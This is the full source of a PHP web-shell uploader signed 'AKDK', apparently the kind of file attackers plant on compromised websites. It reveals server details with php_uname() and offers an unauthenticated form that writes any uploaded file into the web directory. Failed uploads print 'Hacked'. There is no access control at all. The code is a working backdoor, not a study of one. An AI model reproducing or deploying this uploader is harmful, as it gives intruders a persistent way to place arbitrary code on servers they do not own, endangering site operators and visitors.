<html>
<head>
<title>UPLOADER</title>
<meta name='author' content='AKDK'>
<meta charset="UTF-8">
<body bgcolor="white">
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<center><style type='text/css'>
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Arenq';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: 'Arenq';
	background: transparent;
	font-family: 'Arenq';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Arenq';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Arenq';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Arenq';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>
</head>
<?php

echo "Creat By AKDK";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx'><input type='submit' name='Upload' value='Upload'>
</form>";
if($_POST['Upload']) {
	if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {
	echo "SUCCESS <br><a href='$fullpath'>FILE LOCATION</a>";
	} else {
	echo "Hacked";
	}
}
?>